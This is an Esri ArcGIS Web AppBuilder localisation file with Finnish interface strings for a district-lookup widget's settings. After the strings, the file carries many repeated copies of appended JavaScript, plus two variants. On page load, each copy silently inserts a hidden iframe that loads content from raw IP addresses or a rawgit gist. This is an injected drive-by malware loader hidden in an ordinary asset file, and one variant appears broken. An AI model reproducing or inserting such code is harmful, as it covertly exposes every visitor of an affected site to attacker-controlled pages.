// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Mailia",kilometers:"Kilometri\u00e4",feet:"Jalkaa",meters:"Metri\u00e4"},layerSetting:{layerSettingTabTitle:"Hakuasetukset",buttonSet:"Aseta",selectLayersLabel:"Valitse karttataso",selectLayersHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n aluekarttatason ja siihen liittyv\u00e4n pistekarttatason valintaan.",selectPrecinctSymbolLabel:"Korosta alue valitsemalla symboli",selectGraphicLocationSymbol:"Osoitteen tai sijainnin symboli",graphicLocationSymbolHintText:"Vihje: haetun osoitteen tai napsautetun sijainnin symboli",
precinctSymbolHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n valitun alueen symbolin esitt\u00e4miseen",selectColorForPoint:"Valitse v\u00e4ri pisteen korostamiseksi",selectColorForPointHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n valitun pisteen korostusv\u00e4rin esitt\u00e4miseen"},searchSourceSetting:{searchSourceSettingTabTitle:"Hakul\u00e4hteen asetukset",searchSourceSettingTitle:"Hakul\u00e4hteen asetukset",searchSourceSettingTitleHintText:"Lis\u00e4\u00e4 ja m\u00e4\u00e4rit\u00e4 geokoodauspalveluja tai kohdekarttatasoja haun l\u00e4hteiksi. N\u00e4m\u00e4 m\u00e4\u00e4ritetyt l\u00e4hteet m\u00e4\u00e4ritt\u00e4v\u00e4t, mit\u00e4 hakuruudussa voi hakea",
addSearchSourceLabel:"Lis\u00e4\u00e4 haun l\u00e4hde",featureLayerLabel:"Kohdekarttataso",geocoderLabel:"Geokooderi",nameTitle:"Nimi",generalSettingLabel:"Yleinen asetus",allPlaceholderLabel:"Paikkamerkkiteksti haulle kaikkialta:",allPlaceholderHintText:"Vinkki: Anna teksti, joka n\u00e4ytet\u00e4\u00e4n paikkamerkkin\u00e4 kaikista karttatasoista ja geokooderista haettaessa",generalSettingCheckboxLabel:"N\u00e4yt\u00e4 l\u00f6ydetyn kohteen tai sijainnin ponnahdusikkuna",countryCode:"Maa- tai aluekoodit",
countryCodeEg:"esim. ",countryCodeHint:"Jos j\u00e4t\u00e4t t\u00e4m\u00e4n arvon tyhj\u00e4ksi, ohjelma etsii kaikista maista ja kaikilta alueilta",questionMark:"tulisi k\u00e4ytt\u00e4\u00e4?",searchInCurrentMapExtent:"Etsi vain nykyisest\u00e4 karttalaajuudesta",zoomScale:"Tarkennustaso",locatorUrl:"Geokooderin URL-osoite",locatorName:"Geokooderin nimi",locatorExample:"Esimerkki",locatorWarning:"T\u00e4t\u00e4 geokoodauspalvelun versiota ei tueta. Pienoisohjelma tukee geokoodauspalvelua 10.0 ja sit\u00e4 uudempia versioita.",
locatorTips:"Ehdotukset eiv\u00e4t ole k\u00e4ytett\u00e4viss\u00e4, koska geokoodauspalvelu ei tue ehdotustoimintoa.",layerSource:"Karttatason l\u00e4hde",setLayerSource:"M\u00e4\u00e4rit\u00e4 karttatason l\u00e4hde",setGeocoderURL:"M\u00e4\u00e4rit\u00e4 geokooderin URL-osoite",searchLayerTips:"Ehdotukset eiv\u00e4t ole k\u00e4ytett\u00e4viss\u00e4, koska kohdepalvelu ei tue sivutustoimintoa.",placeholder:"Muuttujan teksti",searchFields:"Hakukent\u00e4t",displayField:"N\u00e4ytt\u00f6kentt\u00e4",
exactMatch:"Tarkka vastine",maxSuggestions:"Ehdotusten enimm\u00e4ism\u00e4\u00e4r\u00e4",maxResults:"Tulosten enimm\u00e4ism\u00e4\u00e4r\u00e4",enableLocalSearch:"Ota k\u00e4ytt\u00f6\u00f6n paikallinen haku",minScale:"V\u00e4himm\u00e4ismittakaava",minScaleHint:"Kun kartan mittakaava on suurempi kuin t\u00e4m\u00e4 mittakaava, k\u00e4ytet\u00e4\u00e4n paikallista hakua",radius:"S\u00e4de",radiusHint:"M\u00e4\u00e4ritt\u00e4\u00e4 nykyisen kartan keskikohdan ymp\u00e4rill\u00e4 olevan alueen s\u00e4teen. S\u00e4teen avulla arvioidaan geokoodausehdokkaiden sijoitusta, jotta sijaintia l\u00e4hinn\u00e4 olevat ehdokkaat palautetaan ensin",
meters:"Metri\u00e4",setSearchFields:"M\u00e4\u00e4rit\u00e4 hakukent\u00e4t",set:"Aseta",fieldName:"Nimi",invalidUrlTip:"Sy\u00f6tetty URL-osoite ${URL} on virheellinen, tai se ei ole k\u00e4ytett\u00e4viss\u00e4.",invalidSearchSources:"Virheelliset hakul\u00e4hteen asetukset"},layerSelector:{selectPolygonLayerLabel:"Valitse aluekarttataso",selectPolygonLayerHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n aluekarttatason valintaan.",selectRelatedPointLayerLabel:"Valitse aluekarttatasoon liittyv\u00e4 pistekarttataso",
selectRelatedPointLayerHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n aluekarttatasoon liittyv\u00e4n pistekarttatason valintaan",polygonLayerNotHavingRelatedLayer:"Valitse aluekarttataso, jossa on siihen liittyv\u00e4 pistekarttataso.",errorInSelectingPolygonLayer:"Valitse aluekarttataso, jossa on siihen liittyv\u00e4 pistekarttataso.",errorInSelectingRelatedLayer:"Valitse aluekarttatasoon liittyv\u00e4 pistekarttataso."},routeSetting:{routeSettingTabTitle:"Suuntien asetukset",routeServiceUrl:"Reitityspalvelu",
buttonSet:"Aseta",routeServiceUrlHintText:"Vihje: selaa ja valitse verkostoanalyysin reitityspalvelu napsauttamalla M\u00e4\u00e4rit\u00e4",directionLengthUnit:"Ajo-ohjeiden pituusyksik\u00f6t",unitsForRouteHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n reitin raportoitujen yksik\u00f6iden n\u00e4ytt\u00e4miseen",selectRouteSymbol:"Valitse reitin n\u00e4ytt\u00e4miseen k\u00e4ytett\u00e4v\u00e4 symboli",routeSymbolHintText:"Vihje: k\u00e4ytet\u00e4\u00e4n viivasymbolin n\u00e4ytt\u00e4miseen reitiss\u00e4",
routingDisabledMsg:"Jos haluat ottaa ajo-ohjeet k\u00e4ytt\u00f6\u00f6n, varmista, ett\u00e4 reititys on k\u00e4yt\u00f6ss\u00e4 ArcGIS Online -kohteessa."},networkServiceChooser:{arcgislabel:"Lis\u00e4\u00e4 ArcGIS Online -palvelusta",serviceURLabel:"Lis\u00e4\u00e4 palvelun URL-osoite",routeURL:"Reitin URL-osoite",validateRouteURL:"Vahvista",exampleText:"Esimerkki",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",
invalidRouteServiceURL:"M\u00e4\u00e4rit\u00e4 kelvollinen reittipalvelu.",rateLimitExceeded:"Nopeusrajoitus ylittyi. Yrit\u00e4 my\u00f6hemmin uudelleen.",errorInvokingService:"K\u00e4ytt\u00e4j\u00e4nimi tai salasana on virheellinen."},symbolPickerPreviewText:"Esikatselu:",showToolToSelectLabel:"M\u00e4\u00e4rit\u00e4 sijainti -painike",showToolToSelectHintText:"Vinkki: Ota k\u00e4ytt\u00f6\u00f6n painike sijainnin m\u00e4\u00e4ritt\u00e4miseksi kartalla sen sijaan, ett\u00e4 sijainti m\u00e4\u00e4ritet\u00e4\u00e4n aina karttaa napsautettaessa",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});